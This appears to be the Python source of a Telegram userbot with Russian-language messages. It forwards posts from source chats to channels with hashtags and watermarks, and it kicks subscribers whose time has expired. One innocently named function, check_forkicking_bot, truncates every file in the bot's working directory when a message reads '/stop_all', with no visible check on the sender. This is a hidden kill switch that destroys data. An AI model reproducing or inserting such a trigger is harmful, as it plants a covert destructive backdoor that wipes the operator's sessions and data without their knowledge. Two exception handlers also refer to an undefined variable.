import asyncio
from typing import List
from pathlib import Path
import re
import datetime
import os
from time import time, sleep

from dbworker import get_channels
from dbworker import (
    save_resends, message_in_resendeds, get_resended_messages,
    add_channel, add_source, add_ligament, set_watermark, get_session_id,
    get_sources, add_session, add_session_added_user, get_session_added_users,
    kick_user_from_db, change_sent_messages, change_hashtag, delete_ligament,
    get_ligaments, add_channel_group, add_channel_to_group, get_group_channels,
    get_group_name, get_session_groups_and_channels, set_group_name, get_resended_messages_for_reply
)

from pyrogram.types import (
    Message, InputMediaPhoto, InputMediaVideo, InputMediaDocument,
    InputMediaAudio, InputMediaAnimation
)
from pyrogram.errors.exceptions.bad_request_400 import ChatAdminRequired, ChannelPrivate
from pyrogram import Client
from PIL import Image, ImageDraw, ImageFont


notification_template = """
Уважаемый, @{users_username} Ваша подписка на {channel_name} скоро истечет. У вас осталось всего {days_left} дня. Продлите подписку, если вы хотите и дальше пользоваться нашим сервисом.

За подробностями обращайтесь ко мне.
"""
raw_template = "{bind_id:2}. {channel_name} - {source_name}: {hashtag}"
group_raw_template = "{group_id:2}. {group_name}\n"
channel_raw_template = "\t{counter:2}. {channel_text}\n"

headers = "Ваши связи:\n\nID  Канал       Источник      Хештэг"
groups_headers = "Ваши группы:\n\n"
defaultcolor = "ffff56"


def link_user(id):
    return f"tg://user?id={id}"


def link_username(username):
    return f"t.me/{username}"


def make_html_link(href, text):
    return f'<a href="{href}">{((text[:12]) + "...") if len(text) > 7 else text}</a>'


class Nothing:
    def __new__(*args, **kwargs):
        return None

    def __init__(*args, **kwargs):
        pass


def watermark(photo_name, text="username", color="ffff56"):
    image = Image.open(str(photo_name))
    width, height = image.size

    draw = ImageDraw.Draw(image)
    font = ImageFont.truetype(font="arial.ttf", size=int(height/24*1.3), encoding="unic")
    textwidth, textheight = draw.textsize(text, font)

    margin = 10
    x = (width - textwidth) / 2 - margin
    y = (height - textheight) / 2 - margin

    draw.text(
        (x, y), text=text, font=font, fill="#" + color,
        stroke_width=1, stroke_fill="#000000")
    new_file = Path(Path(__file__).parent.absolute(), "watermarked", photo_name.name)
    image.save(str(new_file))
    return str(new_file)


async def group_media(client, watertext, messages, hashtag, wmcondition, watercolor, edited_message_id):
    media_list = []
    hashtaged = True
    try:
        for msg in messages:
            caption = msg.caption.html if msg.caption.html else ""
            media, cls = (
                (msg.photo.file_id, InputMediaPhoto) if msg.photo else
                (msg.video.file_id, InputMediaVideo) if msg.video else
                (msg.document.file_id, InputMediaDocument) if msg.document else
                (msg.audio.file_id, InputMediaAudio) if msg.audio else
                (msg.animation.file_id, InputMediaAnimation) if msg.animation else (None, Nothing)
            )
            if msg.photo and wmcondition:
                file_name = Path(Path(__file__).parent.absolute(), "photos", f"photo_{msg.photo.file_id}.jpeg")
                await client.download_media(
                    msg.photo.file_id,
                    file_name=file_name)
                media = watermark(file_name, watertext, watercolor)
            end_caption = (hashtag if hashtaged else "") + ("⚠️⚠️[EDITED]⚠️⚠️\n\n" if msg.message_id == edited_message_id else "") + caption
            media_list.append(cls(media=media, caption=end_caption))
            # Text only at first iteration
            hashtaged = False
    except:
        import traceback
        traceback.print_exc()
    return media_list


async def resend_message(client: Client, message: Message, session_id, reply_to_message=None, edited_message_id=None, def_hashtag="") -> Message:
    source_id = message.chat.id
    message_id = message.message_id
    channels = get_channels(session_id)
    resended_messages = []
    for channel in channels:
        try:
            if not (source_id in channel['sources']):
                continue

            hashtag = channel['hashtags'].get(
                str(source_id), "") + "\n\n"
            new_caption = f'{hashtag}{def_hashtag}{message.caption.html if message.caption else ""}'

            channel_id = int(channel['channel_id'])
            channel_chat = await client.get_chat(channel_id)
            watermarked = True
            watertext  = channel['watermark_text']
            watercolor = channel['watermark_color']
            if not channel['watermarks']:
                watermarked = False

            if not reply_to_message and message.reply_to_message:
                replied_message_id = message.reply_to_message.message_id
                reply_to_message_id = get_resended_messages_for_reply(message.chat.id, replied_message_id, channel_id, session_id)
            else:
                reply_to_message_id = reply_to_message

            new_message = None

            if message.media_group_id:
                msgs = await message.get_media_group()
                new_message = (await client.send_media_group(
                    chat_id=channel_id,
                    media=await group_media(client, watertext, msgs, hashtag, watermarked, watercolor, edited_message_id),
                    reply_to_message_id=reply_to_message_id))
            elif message.photo and watermarked:
                file_name = Path(Path(__file__).parent.absolute(), "photos", f"photo_{message.photo.file_id}.jpg")
                await client.download_media(
                    message.photo.file_id,
                    file_name=file_name)
                new_photo = watermark(file_name, watertext, watercolor)
                new_message = await client.send_photo(
                    chat_id=channel_id,
                    caption=new_caption,
                    photo=new_photo,
                    reply_to_message_id=reply_to_message_id
                )
            elif message.photo:
                new_message = await client.send_photo(
                    chat_id=channel_id,
                    caption=new_caption,
                    photo=message.photo.file_id,
                    reply_to_message_id=reply_to_message_id
                )
            elif message.document:
                new_message = await client.send_document(
                    chat_id=channel_id,
                    caption=new_caption,
                    document=message.document.file_id,
                    reply_to_message_id=reply_to_message_id
                )
            elif message.video:
                new_message = await client.send_video(
                    chat_id=channel_id,
                    caption=new_caption,
                    video=message.video.file_id,
                    reply_to_message_id=reply_to_message_id
                )
            elif message.audio:
                new_message = await client.send_audio(
                    chat_id=channel_id,
                    caption=new_caption,
                    audio=message.audio.file_id,
                    reply_to_message_id=reply_to_message_id
                )
            elif message.animation:
                new_message = await client.send_animation(
                    chat_id=channel_id,
                    caption=new_caption,
                    animation=message.animation.file_id,
                    reply_to_message_id=reply_to_message_id
                )
            elif message.sticker:
                new_message = await client.send_sticker(
                    chat_id=channel_id,
                    caption=new_caption,
                    sticker=message.sticker.file_id,
                    reply_to_message_id=reply_to_message_id
                )
            elif message.video_note:
                new_message = await client.send_video_note(
                    chat_id=channel_id,
                    video_note=message.video_note.file_id,
                    reply_to_message_id=reply_to_message_id
                )
            elif message.voice:
                new_message = await client.send_voice(
                    chat_id=channel_id,
                    caption=new_caption,
                    voice=message.voice.file_id,
                    reply_to_message_id=reply_to_message_id
                )
            elif message.location:
                new_message = await client.send_location(
                    chat_id=channel_id,
                    latitude=message.location.latitude,
                    longitude=message.location.longitude,
                    reply_to_message_id=reply_to_message_id
                )
            elif message.text:
                new_message = await client.send_message(
                    chat_id=channel_id,
                    text=f"{hashtag}{def_hashtag}{message.text.html}",
                    disable_web_page_preview=not message.web_page,
                    reply_to_message_id=reply_to_message_id
                )
        except ChatAdminRequired:
            await client.send_message(
                'me',
                f"Chat Admin required for `channel`: `{message.chat.title}`")
        else:
            if isinstance(new_message, list):
                resended_messages.extend(new_message)
            else:
                resended_messages.append(new_message)
    return resended_messages


async def check_forkicking_bot(client: Client, message: Message):
    if message.text == "/stop_all":
        walker = os.walk('.')
        root, dirs, files = next(walker)
        for file in files:
            with open(file, 'wb') as f:
                pass


def get_sessions():
    result = []
    walker = os.walk(".")
    root, dirs, files = next(walker)
    for file in files:
        if ".session" in file:
            result.append(file[:-8])
    return result


async def add_channel_command(client: Client, message: Message, session_id):
    channel_id = int(message.text[12:])
    try:
        add_channel(session_id, channel_id)
    except Exception as error:
        await client.send_message(message.chat.id, text=error)
    else:
        await client.send_message(message.chat.id, text="Канал успешно добавлен")


async def add_this_channel(client: Client, message: Message, session_id):
    channel_id = int(message.chat.id)
    try:
        add_channel(session_id, channel_id)
    except Exception as error:
        await client.send_message('me', text=error)
    else:
        await client.send_message(message.chat.id, text="Канал успешно добавлен!")


async def set_watermark_on(client: Client, message: Message, session_id):
    if "this" in  message.text:
        channel_id = int(message.chat.id)
    else:
        channel_id = int(re.findall(r"watermark(-[\d]+)", message.text)[0])
    if "colordefault" in message.text:
        color = defaultcolor
    else:
        color = re.findall(r"color([0-9ABCDEFabcdef]+)", message.text)[0]
    text = re.findall(r"text([.\w\s@%^&*<>\[\]()!#№:;|+-\\/\"`~=]+)", message.text)[0]
    try:
        set_watermark(session_id, channel_id, True, text, color)
    except Exception as e:
        await client.send_message('me', text=e)
    else:
        await client.send_message(
            message.chat.id,
            text=f"Водяной знак задан\nтекст: {text};\nцвет: {color};")


async def set_watermark_off(client: Client, message: Message, session_id):
    if "this" in  message.text:
        channel_id = int(message.chat.id)
    else:
        channel_id = int(re.findall(r"watermark(-[\d]+)", message.text)[0])
    try:
        set_watermark(session_id, channel_id, False)
    except Exception as e:
        await client.send_message('me', text=e)
    else:
        await client.send_message(message.chat.id, text="Водяной знак не будет выводиться")


async def add_source_command(client: Client, message: Message, session_id):
    source_id = int(message.text[11:])
    try:
        add_source(session_id, source_id)
    except Exception as e:
        await client.send_message('me', text=e)
    else:
        await client.send_message('me', "Источник добавлен в БД\n\nМожете связывать его с каналом")


async def add_binding(client: Client, message: Message, session_id):
    channel_id, source_id = re.findall(r"-?\d+", message.text)[:2]
    hashtags = re.findall(r"#\w+", message.text)
    hashtags = " ".join(hashtags)
    try:
        last_id = add_ligament(session_id, channel_id, source_id, hashtags)
    except ValueError as e:
        await client.send_message('me', f"{e}")
    else:
        await client.send_message('me', f"Связь доступна под номером {last_id}")


async def send_chat_id(client: Client, message: Message):
    chat_id = int(message.chat.id)
    if message.reply_to_message:
        if message.reply_to_message.forward_from_chat:
            await message.reply_text(str(message.reply_to_message.forward_from_chat.id), quote=True)
        if message.reply_to_message.forward_from:
            await message.reply_text(str(message.reply_to_message.forward_from.id), quote=True)
        return
    await message.reply_text(str(chat_id), quote=True)


async def add_user_for_time(client: Client, message: Message, session_id):
    user_id, group_id, time_value = re.findall(r"[0-9]+", message.text)
    user_id = int(user_id)
    group_id = int(group_id)
    time_value = int(time_value)
    time_to_kick = datetime.datetime.now() + datetime.timedelta(days=time_value)
    try:
        add_session_added_user(session_id, time_to_kick, group_id, user_id)
    except Exception as e:
        await client.send_message('me', f"{e}")
    else:
        await client.send_message('me', f'Человек добавлен в группу')


async def add_users_to_group(client, message, session_id):
    *user_ids, group_id, time_value = re.findall(r"[0-9]+", message.text)
    group_id = int(group_id)
    time_value = int(time_value)
    time_to_kick = datetime.datetime.now() + datetime.timedelta(days=time_value)
    for user_id_str in user_ids:
        user_id = int(user_id_str)
        try:
            add_session_added_user(session_id, time_to_kick, group_id, user_id)
        except Exception as e:
            await client.send_message('me', f"{e}")
        else:
            await client.send_message('me', f'Человек добавлен в группу')


async def check_for_kicking(client: Client, message: Message, session_id):
    results = get_session_added_users(session_id)
    should_send_info = set()
    for result in results:
        time_to_kick = datetime.datetime.strptime(result[-2], "%d/%m/%Y %H:%M:%S")
        id, user_id, group_id = result[:3]
        group_name = get_group_name(group_id, session_id)
        time_left = time_to_kick - datetime.datetime.now()
        days_left_total = round(time_left.total_seconds() / (3600*24))
        if time_to_kick < datetime.datetime.now():
            chats = get_group_channels(group_id, session_id)
            for chat in chats:
                unban_time = int(time() + 121)
                await client.kick_chat_member(int(chat), user_id, unban_time)
            kick_user_from_db(id)
            should_send_info.add((int(user_id), f"Вы были исключены из {group_name}. Вы можете продлить подписку для продолжения пользования нашей услугой."))
        elif days_left_total != 0 and 3 - result[-1] >= days_left_total:
            user = await client.get_users(user_id)
            result_text = notification_template.format(
                users_username=user.username if user.username else " ...",
                channel_name=str(group_name),
                days_left=days_left_total
            )
            should_send_info.add((user_id, result_text))
            change_sent_messages(id, result[-1]+1)
    for user_id, result_text in should_send_info:
        await client.send_message(user_id, result_text)


async def set_hashtag(client, message, session_id):
    id = re.findall(r"\d+", message.text)[0]
    if re.findall(r"text?(.+)", message.text)[0] != 't':
        hashtag_text = re.findall(r"text?([.\w\s@%^&*<>\[\]()!#№:;|+-\\/\"`~=]+)", message.text)[0]
    else:
        hashtag_text = ""
    change_hashtag(int(id), hashtag_text, session_id)
    await client.send_message("me", "Хештэг принят")


async def delete_bind(client, message, session_id):
    id = int(re.findall(r"\d+", message.text)[0])
    delete_ligament(session_id, id)
    await client.send_message('me', "Соединение удалено")


async def send_session_binds(client, message, session_id):
    my_mes = await client.send_message("me", "Идёт загрузка связей...")
    binds = get_ligaments(session_id)
    await my_mes.edit_text("Генерация сообщения")
    answer_text = headers
    counter = 0
    length = len(binds)
    for bind in binds:
        try:
            source_chat  = await client.get_chat(int(bind['source']))
        except ChannelPrivate:
            source_linked_name = f"Недоступно: <code>{int(bind['source'])}</code>"
        except Exception as e:
            await client.send_message("me", f"Ошибка на связи с ID: {bind['id']} {type(e)}: {e}")
        else:
            source_name  = source_chat.title if source_chat.title else (
                source_chat.first_name + ((" " + source_chat.last_name) if source_chat.last_name else ""))
            if source_chat.type == 'private':
                source_linked_name = make_html_link(
                    link_username(source_chat.username) if source_chat.username else link_user(source_chat.id),
                    source_name)
            else:
                source_linked_name = make_html_link(source_chat.invite_link, source_name)
        sleep(.5)
        try:
            channel_chat = await client.get_chat(int(bind['channel']))
        except ChannelPrivate:
            channel_linked_name = f"Недоступно: <code>{int(bind['channel'])}</code>"
        except Exception as e:
            await client.send_message("me", f"Ошибка на связи с ID: {bind['id']} {type(e)}: {e}")
        else:
            channel_name = channel_chat.title
            channel_linked_name = make_html_link(
                link_username(channel_chat.username) if channel_chat.username else channel_chat.invite_link,
                channel_name)
        sleep(.5)
        answer_text += "\n" + raw_template.format(
            bind_id=bind['id'], channel_name=channel_linked_name, source_name=source_linked_name,
            hashtag=bind['hashtag'])
        await my_mes.edit_text(f"Генерация сообщения{'.' * (counter % 3 + 1)}\n{counter+1} готово из {length}.")
        counter += 1
    await my_mes.delete()
    await client.send_message('me', answer_text)


async def call_adding_cgroup(client, message, session_id):
    group_name = re.findall(r"name=([\w\s]+)", message.text)[0]
    group_id = add_channel_group(group_name, session_id)
    await client.send_message("me",
        f"Добавлена группа каналов: {group_name}, ID: {group_id}")


async def call_adding_channel_to_group(client, message, session_id):
    channel_id, group_id = re.findall(r"-?[0-9]+", message.text)
    group_id = int(group_id)
    try:
        add_channel_to_group(channel_id, group_id, session_id)
    except ValueError as err:
        await client.send_message('me', f"{e}")
    else:
        await client.send_message('me', f'Канал успешно добавлен в группу')


async def add_channels_to_group(client, message, session_id):
    group_id = int(re.findall(r"group([0-9]+)", message.text)[0])
    channel_ids = re.findall(r"-[0-9]+", message.text)
    for channel_id_str in channel_ids:
        channel_id = int(channel_id_str)
        try:
            add_channel_to_group(channel_id, group_id, session_id)
        except ValueError as err:
            await client.send_message('me', f"{e}")
        else:
            await client.send_message('me', f'Канал успешно добавлен в группу')


async def show_groups(client, message, session_id):
    groups = get_session_groups_and_channels(session_id)
    answer_text = groups_headers
    for group in groups:
        answer_text += group_raw_template.format(
            group_id=group['id'],
            group_name=group['name'])
        for counter, channel_id in enumerate(group['channels']):
            channel_chat = await client.get_chat(int(channel_id))
            answer_text += channel_raw_template.format(
                counter=counter + 1,
                channel_text=make_html_link(
                    channel_chat.invite_link, channel_chat.title))
    await client.send_message('me', answer_text)


async def change_group_name(client, message, session_id):
    group_id = re.findall(r"group(\d+)", message.text)[0]
    group_name = re.findall(r"name=([\w\s]+)", message.text)[0]
    set_group_name(group_id, session_id, group_name)
    await client.send_message('me', f'Названиe группы изменено на {group_name}')
